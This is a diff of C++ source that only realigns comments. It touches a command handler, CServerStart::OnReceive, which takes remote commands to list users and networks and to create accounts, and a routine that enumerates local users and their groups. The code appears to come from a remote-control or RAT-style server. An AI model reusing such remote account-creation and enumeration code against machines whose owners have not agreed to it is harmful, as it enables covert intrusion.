@@ -30,13 +30,13 @@ void CServerStart::OnReceive(LPBYTE lpBuffer, UINT nSize)
 	SwitchInputDesktop();
 	switch (lpBuffer[0])
 	{
-	case COMMAND_USER_LIST:     //用户列表
+	case COMMAND_USER_LIST:        //用户列表
 		SendProcessListo();
 		break;
-	case COMMAND_NETWORK_LIST:  //网络列表 0
+	case COMMAND_NETWORK_LIST:     //网络列表 0
 		SendWindowsListo();
 		break;
-	case COMMAND_NET_YHSX:      //用户刷新 0  
+	case COMMAND_NET_YHSX:         //用户刷新 0  
 		SendProcessListo();
 		break;
 	case COMMAND_NET_USER:         //帐户建立
@@ -349,11 +349,11 @@ LPBYTE CServerStart::getProcessListo()
 	dwOffset = 1;
 
 	char ReadRort[50]={NULL};
-	SendNetPortRead(ReadRort);   //端口读取
-    for(int i=0;i<nuser;i++)//循环用户  
+	SendNetPortRead(ReadRort);                  //端口读取
+    for(int i=0;i<nuser;i++)                    //循环用户  
 	{
 		char Groups[256]={NULL};
-		getall_Groups(user_all[i],Groups);  //根据用户 查找用户组
+		getall_Groups(user_all[i],Groups);      //根据用户 查找用户组
 		BOOL stt=IsGuestDisabled(user_all[i]);  //根据用户 得出用户状态
 		char *GetInfo="启用";
 		if(stt)
